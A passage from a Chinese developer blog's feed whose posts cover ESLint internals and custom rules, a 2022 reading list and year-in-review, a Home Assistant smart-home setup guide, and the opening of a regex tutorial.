节点：</p><ul><li>Identifier</li><li>ImportSpecifier</li><li>ImportDefaultSpecifier</li><li>CallExpression</li><li>MemberExpression</li><li>AssignmentExpression</li><li>ArrayExpression</li><li>VariableDeclaration</li><li>LogicalExpression</li><li>ConditionalExpression</li><li>IfStatement</li><li>Literal</li><li>BinaryExpression</li><li>BinaryOperator</li><li>ExpressionStatement</li><li>ThisExpression</li><li>ObjectExpression</li><li>NewExpression</li><li>Property</li><li>TemplateLiteral</li><li>TemplateElement</li><li>…</li></ul><p>常见的节点比较多，不需要死记硬背，有个大致印象就好。需要生成 ast ，可以使用下面这个网站：<br><a href="https://astexplorer.net/">https://astexplorer.net/</a></p><p>可以快速生成查阅 ast 节点。</p><h3 id="astw"><a href="#astw" class="headerlink" title="astw"></a>astw</h3><p>esprima 是生成 ast，那么 astw 猜测这里就是遍历 ast ？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> ast <span class="token operator">=</span> esprima<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> loc<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> range<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            walk <span class="token operator">=</span> <span class="token function">astw</span><span class="token punctuation">(</span>ast<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">walk</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            api<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>type<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第一次调用，也是做的一些配置合并的操作，返回了 walk 函数。<br>walk 函数再次调用，会遍历 ast 节点，对于最终子节点，会执行回调函数。<br>回调函数根据事件 <code>emit、on</code> 进一步执行是否需要 <code>report</code> 的逻辑。<br><img src="/images/2023/02/16/16765048037892.jpg"></p><p><img src="/images/2023/02/16/16765047143617.jpg"></p><p>到这里，源码分析基本完成。逻辑非常清晰，读取配置，读取自定义规则，配置合并，文件转换为 ast，遍历 ast 节点并和规则做对比。</p><h3 id="后续-ESLint-迭代"><a href="#后续-ESLint-迭代" class="headerlink" title="后续 ESLint 迭代"></a>后续 ESLint 迭代</h3><p>后续 ESLint 越来越复杂，部分开源的内容，已经跟不上 ESLint 的发展，有了一些自己的视线</p><ul><li><a href="https://github.com/eslint/espree">eslint/espree: An Esprima-compatible JavaScript parser</a>：Espree 是 esprima 的新的实现，满足了新的 js 语法需求</li></ul><p>plugin 机制，你可以直接替换编译器，自己构建语法解析器，ESLint 完全变成工具人，只负责主线流程，其他都可以自己实现，使得社区快速完成了对 <code>vue、jsx</code> 等的语法解析。直接干死了 <code>jslint</code>。后续 ts 推出了 <code>TSLint</code>，但是没多久也放弃了，直接被 <code>ESLint</code> 吞并。</p><h2 id="跑题了？"><a href="#跑题了？" class="headerlink" title="跑题了？"></a>跑题了？</h2><p>咦，我们是不是跑题了？看到这里，我还不会写 ESLint 规则嘛。下面其实很简单了。</p><p>全局安装脚手架</p><pre class=" language-js"><code class="language-js">npm i <span class="token operator">-</span>g yonpm i <span class="token operator">-</span>g generator<span class="token operator">-</span>eslint</code></pre><p>生成项目骨架</p><pre class=" language-js"><code class="language-js">yo eslint<span class="token punctuation">:</span>plugin</code></pre><p>根据这个骨架，你就可以开发自己的 ESLint 规则，比如 <code>new Date</code> 兼容性问题核心代码如下：</p><pre class=" language-js"><code class="language-js"><span class="token function">NewExpression</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token string">'Date'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>arguments<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            context<span class="token punctuation">.</span><span class="token function">report</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                node<span class="token punctuation">,</span>                message<span class="token punctuation">:</span> <span class="token string">"new Date('2022-01-01') 横线写法在ios中会报错"</span><span class="token punctuation">,</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>更多实现细节请参考我对支付宝小程序写的规则<br><a href="https://github.com/Yaob1990/eslint-plugin-alipay-mini">eslint-plugin-alipay-mini</a>：<a href="https://github.com/Yaob1990/eslint-plugin-alipay-mini">https://github.com/Yaob1990/eslint-plugin-alipay-mini</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://segmentfault.com/a/1190000015660623">前端 - 13 个示例快速入门 JS 抽象语法树 - 不挑食的程序员 - SegmentFault 思否</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ESLint 是 js 代码格式化工具，能够自动发现并尝试修复代码中的问题，是团队开发的必备工具。大部分时候，使用既定规则即可，业界也有比较多的成熟配置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;eslint:recommended ESLint内置的推荐规则在么有讲到 所有打钩的就是内
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
  </entry>
  
  <entry>
    <title>2022 阅读</title>
    <link href="https://jscoder.com/2023/01/08/anything/2022-reading/"/>
    <id>https://jscoder.com/2023/01/08/anything/2022-reading/</id>
    <published>2023-01-08T15:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主题阅读"><a href="#主题阅读" class="headerlink" title="主题阅读"></a>主题阅读</h2><h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><ul><li><a href="https://book.douban.com/subject/30180100/">JavaScript ES6函数式编程入门经典 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/30283769/">JavaScript函数式编程指南 (豆瓣)</a></li></ul><p>我正式的入门变成应该是从 sicp 开始的（虽然没有看完），所以对函数式编程一直抱有浓厚的兴趣。入门经典确实很入门，对函子、Monad 这些核心概念基本是一笔带过，只给你画出了一个轮廓，很薄的一本小册子，建议 3 天看完。</p><p>JavaScript 函数式编程指南，这本用来入门很不错，各种概念都比较明晰，今年应该还会再看一遍。</p><p>但是这两本书，都让人感觉干巴巴的，都还是范畴论那一套东西，如果用现代框架，结合函数式编程讲解，感觉是极好的，但是好像很少看到这样的书籍或者课程。</p><h3 id="vue3"><a href="#vue3" class="headerlink" title="vue3"></a>vue3</h3><ul><li><a href="https://book.douban.com/subject/35768338/">Vue.js设计与实现 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/36092368/">Vue.js技术内幕 (豆瓣)</a></li><li><a href="https://learn.cuixueshe.com/p/t_pc/goods_pc_detail/goods_detail/p_61fb595ce4b0beaee4275e1e">Vue3 源码实战课</a></li></ul><p>设计与实现作者是霍春阳，以前看过他写的 <a href="https://github.com/HcySunYang/vue-design">GitHub - HcySunYang/vue-design: 📖 master分支：《渲染器》</a>，写的非常好，这本 vue3 的设计与实现，依然保持了高水准。注意，这本书不是 vue3 源码的解读，而是一步一步的引导你理解 vue3 的设计。响应系统，diff 算法写的很不错，虽然有的地方还是不好理解。</p><p>技术内幕，黄轶的作品，一言难尽。和他的视频一个风格，大段大段的代码篇幅，如果没有基础，看这本书会很懵逼，这本书不是给新手的，而是有一定基础的。建议看完设计与实现之后，挑着看一部分，两本书可以相互补充。</p><p>催学社 vue3 源码实战课，视频课程，很不错，老师讲的通俗易懂，有很多细节的补充，带着你一点点的把 vue3 核心代码写一遍，推荐。</p><h2 id="其他技术书籍"><a href="#其他技术书籍" class="headerlink" title="其他技术书籍"></a>其他技术书籍</h2><ul><li><a href="https://book.douban.com/subject/35290878/">精通Rust（第2版）(豆瓣)</a></li><li><a href="https://book.douban.com/subject/26967597/">Vim实用技巧（第2版）(豆瓣)</a></li><li><a href="https://book.douban.com/subject/26382780/">JavaScript设计模式与开发实践 (豆瓣)</a></li></ul><h2 id="社科人文"><a href="#社科人文" class="headerlink" title="社科人文"></a>社科人文</h2><ul><li><a href="https://book.douban.com/subject/1322455/">遥远的救世主 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/24748615/">天幕红尘 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/26880855/">进化 (豆瓣)</a></li></ul><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>准备阅读或者重新阅读的书籍。</p><ul><li><a href="https://book.douban.com/subject/35768338/">Vue.js设计与实现 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/26382780/">JavaScript设计模式与开发实践 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/35923076/">高性能MVVM框架的设计与实现——San (豆瓣)</a></li><li><a href="https://book.douban.com/subject/26148763/">计算的本质 (豆瓣)</a></li><li><a href="https://book.douban.com/subject/36014313/">微前端设计与实现 (豆瓣)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;主题阅读&quot;&gt;&lt;a href=&quot;#主题阅读&quot; class=&quot;headerlink&quot; title=&quot;主题阅读&quot;&gt;&lt;/a&gt;主题阅读&lt;/h2&gt;&lt;h3 id=&quot;函数式编程&quot;&gt;&lt;a href=&quot;#函数式编程&quot; class=&quot;headerlink&quot; title=&quot;函数式编程&quot;&gt;
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
  </entry>
  
  <entry>
    <title>2022 回顾</title>
    <link href="https://jscoder.com/2023/01/02/anything/2022/"/>
    <id>https://jscoder.com/2023/01/02/anything/2022/</id>
    <published>2023-01-02T15:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>时光如小偷，一不小心，她已经偷光了你的所有。</p></blockquote><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><p>今年只产出了 11 篇文章，比计划中的要少不少，但是我也不想强求自己，有时候写了，没发表，有时候，是真的没有心境去写。<br>明年，争取，每个月两篇，这样一年就有 24 篇，还是有很多有意思的主题值得去深入的。</p><h2 id="耗尽"><a href="#耗尽" class="headerlink" title="耗尽"></a>耗尽</h2><p>上半年，异常的忙碌，需求膨胀，团队人员激增。整个人就好像陀螺一样，被工作不停的抽打，没有时间思考，没有时间停歇，一刻不停的应付着各色人等。</p><p>工作把我所有的精气神抽干净了，每天回来就是睡觉，两点一线，白头发都多了好多。</p><p>有时候，无休止的工作，让我看不到希望，业务性质的开发让我越来越没有激情，一眼看到头的需求，让我找不到方向。</p><h2 id="决断"><a href="#决断" class="headerlink" title="决断"></a>决断</h2><p>上半年有机会去上海，后来考虑再三还是没有去，终究是有点可惜的。无锡买房也考虑了很久，始终下不了决心，再等等，房价明年也不会有大的变化。也不太想给自己上太高的杠杆，今年吧，今年看看能不能把这个事情定下来。</p><h2 id="耗散"><a href="#耗散" class="headerlink" title="耗散"></a>耗散</h2><p>还是有很多的事情在耗散我的精力，无法持续的聚焦。天下事没必要关心，国事天下事，改变不了，甚至路边的流浪猫，也改变不了。不用关心这些改变不了的事情，聚焦精力到自己手上的事情，把体验做到极致，才是更好的方向。</p><h2 id="35岁"><a href="#35岁" class="headerlink" title="35岁"></a>35岁</h2><p>30 岁之后，35岁就像一个死亡倒计时，一刻不停的在计数，让人恐惧。我大概知道 35 岁以后，我还是会写代码，但是也明显的感受到了时间的流逝，机会的减少。</p><p>我想在今年做些改变，不再写一些 demo 性质的项目，开始自己一直想做但是一直没有做的项目，赚不赚钱不重要，重要的是实现自己的想法，如果 35岁是个坎，就让它成为 35岁 的注解。</p><p>流淌的代码，自由的思维，我想在写代码的路上走的更远一点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;时光如小偷，一不小心，她已经偷光了你的所有。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;博客&quot;&gt;&lt;a href=&quot;#博客&quot; class=&quot;headerlink&quot; title=&quot;博客&quot;&gt;&lt;/a&gt;博客&lt;/h2&gt;&lt;p&gt;今年只产出了 11 篇文章
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
  </entry>
  
  <entry>
    <title>HomeAssistant 智能家居入门</title>
    <link href="https://jscoder.com/2022/12/26/anything/smart-home/"/>
    <id>https://jscoder.com/2022/12/26/anything/smart-home/</id>
    <published>2022-12-26T03:34:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>智能家居有很多厂商的方案，但是基本都是打包方案，很难在 AB 厂家之间做联动，并且这些方案都依赖厂家的服务器，服务器出现问题，智能变智障。</p><ol><li>依赖厂商服务器</li><li>无隐私可言，数据被厂商分析</li><li>难以多品牌联动</li><li>难以定制化</li></ol><h2 id="Home-Assistant"><a href="#Home-Assistant" class="headerlink" title="Home Assistant"></a>Home Assistant</h2><p>Home Assistant 诞生于 2013 年，是一款基于 Python 开发的 智能家居 开源系统，他的主要功能就是可以将不同品牌的智能家居设备连接起来互联互通。<br>这个开源项目已经发展了已经快十年了，同时期的其他类似项目都已经雨打风吹去了，目前看 Home Assistant 更新还是很频繁的，每个月都有好几个版本发布。</p><p><img src="/images/2022/12/26/16720467288022.jpg"></p><p>目前我手上绝大部分智能家居设备都可以通过 HomeAssistant 接入。</p><ol><li>群晖：监听温度，硬盘状态等</li><li>美的燃气热水器：水温，能耗</li><li>小米、涂鸦开关：开关通断、能耗</li><li>米家空调伴侣：自动化空调设置</li><li>小米手机：判断是否在家，自动化灯具</li><li>Apple tv：自动化开启关闭等</li><li>涂鸦窗帘机：自动化窗帘开启关闭</li></ol><p><img src="/images/2022/12/26/16720467288022.jpg"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>Docker 安装，注意这个版本是半残废版本，没有 addon-on,</li><li>虚拟机安装，如果使用 unraid，群晖，建议安装这个版本，功能最全</li><li>购买成品，一般是魔百盒刷机之后，刷入了 Debian，然后安装的 HomeAssistant<br><img src="/images/2022/12/26/16720467533799.jpg"></li></ol><p><img src="/images/2022/12/26/16720467618102.jpg"></p><h2 id="zigBee"><a href="#zigBee" class="headerlink" title="zigBee"></a>zigBee</h2><p>ZigBee 实际是一种短距离、低功耗的无线通信技术，名称来源于 ZigZag——一种蜜蜂的肢体语言。当蜜蜂新发现一片花丛后会用特殊舞蹈来告知同伴发现的食物种类及位置等信息，是蜜蜂群体间一种简单、高效的传递信息方式，因此 ZigBee 也被称为“紫蜂协议”。</p><p>技术优势：</p><ol><li>超低功耗</li><li>安全性高</li><li>自组网，可容纳电子设备多</li><li>可靠性高</li></ol><p>不推荐大量设备通过 wifi 接入，使用 zigBee 稳定性要比 wifi 高很多，目前我的新购入设备都是 zigBee。</p><h2 id="Zigbee2mqtt"><a href="#Zigbee2mqtt" class="headerlink" title="Zigbee2mqtt"></a>Zigbee2mqtt</h2><p>Zigbee2mqtt 是一个将 Zigbee 协议转化成 MQTT 的桥接工具, 从而接入智能家居平台。推荐直接购买集成了 zigBee 模块的盒子。<br>Zigbee2mqtt 支持的设备多大 2572 种，并且还在持续增加中。</p><p><img src="/images/2022/12/26/16720467728426.jpg"></p><p><img src="/images/2022/12/26/16720467818118.jpg"></p><p><img src="/images/2022/12/26/16720467884269.jpg"></p><h2 id="米家设备——Xiaomi-Miot-Auto"><a href="#米家设备——Xiaomi-Miot-Auto" class="headerlink" title="米家设备——Xiaomi Miot Auto"></a>米家设备——Xiaomi Miot Auto</h2><p><a href="https://iot.mi.com/new/doc/design/spec/overall">MIoT-Spec</a> 是小米 IoT 平台根据硬件产品的联网方式、产品功能的特点、用户使用场景的特征和用户对硬件产品使用体验的要求，设计的描述硬件产品功能定义的标准规范。</p><p>本插件利用了 <strong>miot</strong> 协议的规范，可将小米设备自动接入 <a href="https://www.home-assistant.io/">HomeAssistant</a>，目前已支持大部分小米米家智能设备。且该插件支持 HA 后台界面集成，无需配置 yaml 即可轻松将小米设备接入 HA。</p><h2 id="支持的设备"><a href="#支持的设备" class="headerlink" title="支持的设备"></a><a href="https://github.com/al-one/hass-xiaomi-miot/issues/12">支持的设备</a></h2><ul><li>🔌 <a href="https://home.miot-spec.com/s/plug">插座</a> / <a href="https://home.miot-spec.com/s/switch">开关</a></li><li>💡 <a href="https://home.miot-spec.com/s/light">智能灯</a></li><li>❄️ <a href="https://home.miot-spec.com/s/aircondition">空调</a> / <a href="https://home.miot-spec.com/s/acpartner">空调伴侣</a> / <a href="https://home.miot-spec.com/s/miir.aircondition">红外空调</a></li><li>🌀 <a href="https://home.miot-spec.com/s/fan">风扇</a> / <a href="https://home.miot-spec.com/s/ven_fan">凉霸</a></li><li>🛀 <a href="https://home.miot-spec.com/s/bhf_light">浴霸</a> / 🔥 <a href="https://home.miot-spec.com/s/heater">取暖器</a> / <a href="https://home.miot-spec.com/s/airrtc">温控器</a></li><li>📷 <a href="https://home.miot-spec.com/s/camera">摄像头</a> / <a href="https://home.miot-spec.com/s/cateye">猫眼/可视门铃</a> <a href="https://github.com/al-one/hass-xiaomi-miot/issues/100#issuecomment-903078604">❓️</a></li><li>📺 <a href="https://home.miot-spec.com/s/tv">电视</a> / 📽️ <a href="https://home.miot-spec.com/s/projector">投影仪</a> / <a href="https://home.miot-spec.com/s/tvbox">机顶盒</a></li><li>🗣️ <a href="https://home.miot-spec.com/s/wifispeaker">小爱音箱</a> <a href="https://github.com/al-one/hass-xiaomi-miot/issues/100#issuecomment-885989099">❓️</a></li><li>🎮️ <a href="https://home.miot-spec.com/s/chuangmi.remote">万能遥控器</a> <a href="https://github.com/al-one/hass-xiaomi-miot/commit/fbcc8063783e53b9480574536a034d338634f4e8#commitcomment-56563663">❓️</a></li><li>🔐 <a href="https://home.miot-spec.com/s/lock">智能门锁</a> / 🚪 <a href="https://home.miot-spec.com/s/door">智慧门</a></li><li>👕 <a href="https://home.miot-spec.com/s/washer">洗衣机</a> / <a href="https://home.miot-spec.com/s/dry">干衣机</a> / <a href="https://home.miot-spec.com/s/fridge">冰箱</a></li><li>🚰 <a href="https://home.miot-spec.com/s/waterpuri">净水器</a> / <a href="https://home.miot-spec.com/s/kettle">饮水机</a></li><li>♻️ <a href="https://home.miot-spec.com/s/airpurifier">空气净化器</a> / <a href="https://home.miot-spec.com/s/airfresh">新风机</a> / <a href="https://home.miot-spec.com/s/hood">油烟机</a></li><li>🌡 <a href="https://home.miot-spec.com/s/sensor_ht">温湿度传感器</a> / <a href="https://home.miot-spec.com/s/flood">水侵传感器</a> / <a href="https://home.miot-spec.com/s/sensor_smoke">烟雾传感器</a></li><li>🥘 <a href="https://home.miot-spec.com/s/cooker">电饭煲</a> / <a href="https://home.miot-spec.com/s/pre_cooker">压力锅</a></li><li>🍲 <a href="https://home.miot-spec.com/s/ihcooker">电磁炉</a> / <a href="https://home.miot-spec.com/s/oven">烤箱</a> / <a href="https://home.miot-spec.com/s/microwave">微波炉</a></li><li>🍗 <a href="https://home.miot-spec.com/s/fryer">空气炸锅</a> / <a href="https://home.miot-spec.com/s/mfcp">多功能锅</a></li><li>🍵 <a href="https://home.miot-spec.com/s/health_pot">养生壶</a> / ☕️ <a href="https://home.miot-spec.com/s/coffee">咖啡机</a></li><li>🍹 <a href="https://home.miot-spec.com/s/juicer">破壁机</a> / <a href="https://home.miot-spec.com/s/juicer">搅拌机</a> / <a href="https://home.miot-spec.com/s/f_washer">果蔬清洗机</a></li><li>♨️ <a href="https://home.miot-spec.com/s/waterheater">热水器</a> / <a href="https://home.miot-spec.com/s/dishwasher">洗碗机</a> / <a href="https://home.miot-spec.com/s/foot_bath">足浴器</a></li><li>🦠 <a href="https://home.miot-spec.com/s/steriliser">消毒柜</a></li><li>🪟 <a href="https://home.miot-spec.com/s/curtain">窗帘电机</a> / <a href="https://home.miot-spec.com/s/wopener">开窗器</a> / <a href="https://home.miot-spec.com/s/airer">晾衣机</a></li><li>🧹 <a href="https://home.miot-spec.com/s/vacuum">扫地/扫拖机器人</a> / <a href="https://home.miot-spec.com/s/.mop">擦地机</a></li><li>💦 <a href="https://home.miot-spec.com/s/humidifier">加湿器</a> / <a href="https://home.miot-spec.com/s/derh">除湿器</a> / <a href="https://home.miot-spec.com/s/diffuser">除味器</a></li><li>🍃 <a href="https://home.miot-spec.com/s/airmonitor">空气检测仪</a> / 🪴 <a href="https://home.miot-spec.com/s/plantmonitor">植物监测仪</a></li><li>🛏 <a href="https://home.miot-spec.com/s/bed">电动床</a> / <a href="https://home.miot-spec.com/s/blanket">电热毯/水暖床垫</a> / 😴 <a href="https://home.miot-spec.com/s/lunar">睡眠监测仪</a></li><li>💆 <a href="https://home.miot-spec.com/s/massage">按摩椅</a> / <a href="https://home.miot-spec.com/s/magic_touch">按摩仪</a></li><li>🏃 <a href="https://home.miot-spec.com/s/walkingpad">走步机</a> / <a href="https://home.miot-spec.com/s/treadmill">跑步机</a> / <a href="https://home.miot-spec.com/s/desk">升降桌</a></li><li>🚽 <a href="https://home.miot-spec.com/s/toilet">马桶(盖)</a> /️ <a href="https://home.miot-spec.com/s/.tow">毛巾架</a> /️ 🪥 <a href="https://home.miot-spec.com/s/toothbrush">牙刷</a></li><li>🐱 <a href="https://home.miot-spec.com/s/feeder">宠物喂食器</a> / ⛲ <a href="https://home.miot-spec.com/s/pet_waterer">宠物饮水机</a> / 🐟 <a href="https://home.miot-spec.com/s/fishbowl">鱼缸</a></li><li>🦟 <a href="https://home.miot-spec.com/s/mosq">驱蚊器</a> / <a href="https://home.miot-spec.com/s/s_lamp">消毒/灭菌灯</a></li><li>🚘 <a href="https://home.miot-spec.com/s/rv_mirror">智能后视镜</a> / <a href="https://home.miot-spec.com/s/hud">抬头显示HUD</a></li><li>⌚️ <a href="https://home.miot-spec.com/s/watch">智能/儿童手表</a> / <a href="https://home.miot-spec.com/s/bracelet">手环</a></li><li>🚶 <a href="https://home.miot-spec.com/s/motion">人体传感器</a> / 🧲 <a href="https://home.miot-spec.com/s/magnet">门窗传感器</a> <a href="https://github.com/al-one/hass-xiaomi-miot/issues/100#issuecomment-909031222">❓️</a></li><li>📳 <a href="https://home.miot-spec.com/s/vibration">动静贴</a></li><li>🌐 <a href="https://home.miot-spec.com/s/router">路由器</a> / 🖨 <a href="https://home.miot-spec.com/s/printer">打印机</a></li></ul><p>接入之后，几乎不需要任何配置就可以直接使用，并且和手机使用米家不冲突。</p><h2 id="ESP32"><a href="#ESP32" class="headerlink" title="ESP32"></a>ESP32</h2><p>上面这些东西，包括进一步的自动化，可以玩一个月了，如果还不过瘾，可以继续看看 ESP32，自己动手做智能家居。</p><p>ESP32 说的是主板上的主控芯片，是由我国的乐鑫公司 (ESPRESSIF) 继 ESP8266 芯片后推出的又一款集成 WiFi 功能的微控制器。ESP32 芯片或模组具有下列特点：</p><p>处理器：Tensilica LX6 双核处理器（一核处理高速连接；一核独立应用开发）<br>主频：32 位双核处理器，CPU 正常工作速度为 80 MHz，最高可达 240 MHz<br>SRAM：520KB，最大支持 8 MB 片外 SPI SRAM<br>Flash：最大支持 16 MB 片外 SPI Flash<br>WiFi 协议：支持 802.11 b/g/n/d/e/i/k/r 等协议，速度高达 150 Mbps<br>频率范围：2.4~2.5 GHz<br>蓝牙协议：支持蓝牙 v4.2 完整标准，包含传统蓝牙 (BR/EDR) 和低功耗蓝牙 (BLE)<br>同时他还具备丰富的外设接口：比如 GPIO、ADC、DAC、SPI、I²C、I²S、UART 等常用接口一个不少</p><h3 id="独立网关"><a href="#独立网关" class="headerlink" title="独立网关"></a>独立网关</h3><p><img src="/images/2022/12/26/16720468061875.jpg"></p><p><img src="/images/2022/12/26/16720468142750.jpg"></p><p>小黄鱼有很多出售这种 zigBee 带网关的，就是使用 ESP32 来实现的，ESP32 运行服务器，mqtt 等内容，对外发送报文，这样就可以不走 H omeAssistant 类似平台，但是弱点也很明显，支持的设备有限，每次新增设备类型，就需要刷新固件，或者自己编译固件，如果对方固件不开源，那可玩性就大打折扣。</p><h3 id="自己做摄像头"><a href="#自己做摄像头" class="headerlink" title="自己做摄像头"></a>自己做摄像头</h3><p><a href="https://zhuanlan.zhihu.com/p/577606023">ESP32 CAM通过ESPHome连接到Homeassistant - 知乎</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/577606023">ESP32 CAM通过ESPHome连接到Homeassistant - 知乎</a></li><li><a href="https://iot.mi.com/new/doc/introduction/main">小米IoT开发者平台</a></li><li><a href="https://www.home-assistant.io/">Home Assistant</a></li><li><a href="https://www.zigbee2mqtt.io/">Home | Zigbee2MQTT</a></li><li><a href="https://www.xiaoweigod.com/network/2235.html">小米智能家居第三方控制之一：提取米家API并控制-小伟博客</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;智能家居有很多厂商的方案，但是基本都是打包方案，很难在 AB 厂家之间做联动，并且这些方案都依赖厂家的服务器，服务器出现问题，智能变智障。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;依赖厂商服务器&lt;/li&gt;
&lt;li&gt;无隐私可言，数据被厂商分析&lt;/li&gt;
&lt;li&gt;难以多品牌联动&lt;/li&gt;
&lt;
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
      <category term="智能家居" scheme="https://jscoder.com/tags/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://jscoder.com/2022/12/02/front-end/regex/"/>
    <id>https://jscoder.com/2022/12/02/front-end/regex/</id>
    <published>2022-12-02T15:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。能够实现模糊匹配。</p><ol><li>横向模糊匹配：正则可匹配的字符串的长度是不固定的</li><li>纵向模糊匹配：正则匹配的字符串，具体到某一位数字时，他可以不是某个确定的字符，可以用多种可能。</li></ol><h2 id="匹配字符"><a href="#匹配字符" class="headerlink" title="匹配字符"></a>匹配字符</h2><h3 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h3><p><img src="/images/2022120201.png"></p><h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><img src="/images/Pasted%20image%2020221125071208%203.png"></p><h2 id="匹配位置"><a href="#匹配位置" class="headerlink" title="匹配位置"></a>匹配位置</h2><table><thead><tr><th align="left">符号</th><th>含义</th></tr></thead><tbody><tr><td align="left">^</td><td>匹配开头，在多行匹配中匹配行开头</td></tr><tr><td align="left">$</td><td>匹配结尾，在多行匹配中匹配行结尾</td></tr><tr><td align="left">\b</td><td>\b 是单词边界, 具体就是 \w 与 \W 之间的位置, 也包括 \w 与 ^ 之间的位置, 和 \w 与 $ 之间的位置。</td></tr><tr><td align="left">\B</td><td>\B 就是 \b 的反面的意思,非单词边界。例如在字符串中所有位置中,扣掉 \b,剩下的都是 \B 的。</td></tr><tr><td align="left">(?=p)</td><td>(?=p), p 是子模式，即 p 前面的位置</td></tr><tr><td align="left">(?! p)</td><td>与 (？=p) 相反，即非 p 前面的位置</td></tr><tr><td align="left">(?&lt;=p)</td><td>只有在 p 后面才匹配</td></tr><tr><td align="left">(?&lt;! p)</td><td>匹配非 p 后面位置，和上面相反</td></tr></tbody></table><h2 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h2><p>括号提供子表达式，强调括号内的正则是一个整体。</p><ol><li>分组</li><li>分支结构</li></ol><h3 id="分组引用"><a href="#分组引用" class="headerlink" title="分组引用"></a>分组引用</h3><p>分组引用比普通模式多了分组编号， #1 #2 #3</p><p>![[Pasted image 20221125073625.png]]</p><h3 id="提取数据、替换"><a href="#提取数据、替换" class="headerlink" title="提取数据、替换"></a>提取数据、替换</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d&amp;#123;4&amp;#125;)-(\d&amp;#123;2&amp;#125;)-(\d&amp;#123;2&amp;#125;)/</span><span class="token punctuation">;</span> <span class="token keyword">var</span> string <span class="token 